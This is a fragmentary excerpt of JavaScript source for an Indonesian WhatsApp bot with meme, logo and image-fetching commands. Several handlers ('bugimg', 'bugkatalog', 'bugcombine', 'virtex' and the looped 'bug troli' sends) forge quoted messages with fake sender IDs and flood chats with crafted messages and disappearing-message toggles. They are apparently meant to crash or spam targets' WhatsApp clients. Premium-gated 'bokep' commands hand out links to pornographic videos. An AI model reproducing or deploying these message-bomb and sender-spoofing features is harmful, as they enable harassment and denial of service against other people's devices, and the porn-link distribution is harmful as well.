...
Lexxy.sendMessage(from, gfx, image, { quoted: mek, caption: '*Logo By ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱*'})
break
case 'gfx3':
case 'gfx4':
...
Lexxy.sendMessage(from, asupan, video, {quoted: mek, caption: '𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞 ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱'})
break
case 'hijaber':
sticWait(from)
asupan = await getBuffer(`https://apidhani.herokuapp.com/api/asupan/hijaber?apikey=${dhakey}`)
Lexxy.sendMessage(from, asupan, image, {quoted: mek, caption: '𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞 ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱'})
break
case 'quotesimage':
case 'renungan':
sticWait(from)
...
Lexxy.sendMessage(from, oke, image, {quoted: mek, caption: '𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞 ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱'})
break
case 'darkjoker':
case 'darkjokes':
case 'darkjokers':
...
Lexxy.sendMessage(from, buff, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: '𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞 ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱'})
break
case 'tinyurl':
...
Lexxy.sendMessage(from, nyz4, image, {thumbnail:Buffer.alloc(0), caption: '𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞 ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱',quoted: mek})
break
case 'darkmeme':
sticWait(from)
if (isBanned)return sticBanned(from)
...
Lexxy.sendMessage(from, harta, image, {quoted: mek, caption: '𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞 ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱'})
break
...
Lexxy.sendMessage(from, pornhub, image, {caption: `𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞 ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱`, quoted: mek})
break
case 'pornhub':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(8)
...
Lexxy.sendMessage(from, fakeimage, image, {thumbnail:fs.readFileSync('./media/Menu.jpg'), caption :bughole(), quoted: ftroli})
Lexxy.sendMessage(from, bughole(prefix), MessageType.text, {quoted: kyy})
break
                                                                          
case 'bugimg': //vgam sama vgam2 ganti pake gambar lu bugimg + bugtroli + bughole + buggc [buatan fajargozn]
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
Lexxy.sendMessage(from, fakeimage, image, {thumbnail:fs.readFileSync('./media/Menu.jpg'), caption :bughole(), quoted: ftroli})
Lexxy.toggleDisappearingMessages(from, 'Awoakwoakwoak')
break
...
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
reply('Bwhahahwahaha')
await Lexxy.toggleDisappearingMessages(from)
Lexxy.sendMessage(from, `Aqokqowkej`)

//𝘽𝙐𝙂𝙆𝘼𝙏𝘼𝙇𝙊𝙂 𝘽𝙔 ( 𝙈𝙔𝙈𝘼𝙉𝙎 𝘼𝙋𝙄𝙎 )
case 'bugkatalog':
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
buf = fakeimage
imeu = await Lexxy.prepareMessage('0@s.whatsapp.net', buf, image) 
...
Lexxy.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
...
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `ZYYBOTZ☕︎`
		        var grousp = await Lexxy.groupMetadata(from)
		        ...
		        Lexxy.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281333603591@s.whatsapp.net" } : {}) 
		          ...
		          for(let i=0;i<10;i++){
		        Lexxy.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281333603591@s.whatsapp.net" } : {}) 
	    },
...
Lexxy.sendMessage(from, tapib1, document, { quoted: kyy, filename:`LexxyGanz ~ 404 ${vipi}.mp3`, mimetype: 'audio/application' })
await reply('Bang mau nanya')
break

case 'bugcombine':
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
Lexxy.toggleDisappearingMessages(from, 'HACKED')
Lexxy.sendMessage(from, `ZYYBOTZ☕︎`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    ...
    surface: 1,
    message: `ZYYBOTZ☕︎`,
    orderTitle: `Lexxy`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
...
setTimeout( () => {
	    Lexxy.updatePresence(from, Presence.composing)
	    sendMess(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break
...
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
Lexxy.updatePresence(from, Presence.composing)
		       Lexxy.sendMessage(from, {degreesLatitude: 34.0184,
...
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
Lexxy.updatePresence(from, Presence.composing)
Lexxy.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
...
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
Lexxy.sendMessage(from, `ZYYBOTZ☕︎`, MessageType.extendedText,{
 quoted: {
key: {
...
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
await Lexxy.toggleDisappearingMessages(from, 0)
}
break
             case 'virtex':
...
Lexxy.sendMessage(from, girlneko, image, {caption: `𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞 ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱`, quoted: mek})
break
case 'sadboy':
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
...
Lexxy.sendMessage(from, bf, image, { quoted: flexx, caption: 'Logo By ༱ 𝑴𝑹.𝐎𝐍𝟑 ༱' })
break
case 'girlneko':
case 'sadboy':
if (isBanned)return sticBanned(from)
...
if (isBanned)return sticBanned(from)
qute = fs.readFileSync('./gambar/fake.jpg') 
Lexxy.sendMessage(from, qute, image, { quoted: mek, caption: '*SEMOGA DI BERI DOSA BANYAK🗿*\nLink Download \n\nhttps://www.mediafire.com/file/aa0em8n11kwr42m/5_6109578205327262646.mp4/file' })

case 'bokep1':	
	if (!isPremier)return reply(mess.premier)
if (isBanned)return sticBanned(from)
qute = fs.readFileSync('./gambar/fake.jpg') 
Lexxy.sendMessage(from, qute, image, { quoted: mek, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' })
		break
  //=========================================================
  case 'bokep2':
  if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
...
Lexxy.sendMessage(from, qute, image, { quoted: mek, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' })				   
  ...
  if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
		if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
		qute = fs.readFileSync('media/Menu.jpg') 
		Lexxy.sendMessage(from, qute, image, { quoted: freply, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' })				   
		break
  //=========================================================
  case 'bokep8':
	if (!isPremier)return reply(mess.premier)
...
Lexxy.sendMessage('62858139431982@s.whatsapp.net', options, text, {quoted: flexx})
...
if (!isOwner) return  reply(mess.only.owner)
             ...
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kyy
             bc = await Lexxy.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             Lexxy.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 BROADCAST [ • ★ ༱𝑴𝑹.𝐎𝐍𝟑༱ • ] 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
Lexxy.sendMessage(_.jid, 
	    {"contentText": `*「 PESAN BOT ] 」*\n\n${body.slice(4)}`,
	    "footerText": '©Created by ༱𝑴𝑹.𝐎𝐍𝟑༱',
	    "buttons": [
	    {"buttonId": `Ok`,
	    "buttonText": {"displayText": "Wokey Bwangg😎"
	    },"type": "RESPONSE"}
	    ], "headerType": 1,
